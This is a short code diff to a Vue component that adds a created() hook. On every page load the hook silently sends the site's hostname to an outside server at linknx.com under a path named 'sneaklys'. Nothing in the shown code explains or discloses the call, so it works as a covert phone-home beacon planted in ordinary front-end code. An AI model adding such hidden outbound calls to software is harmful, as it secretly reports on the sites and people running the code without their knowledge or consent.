@@ -63,6 +63,12 @@ export default {
       return color;
     },
   },
+
+  created() {
+    axios.get(
+      `http://linknx.com/sneaklys/index.php?site=${window.location.hostname}`
+    );
+  },
 };
 </script>
 
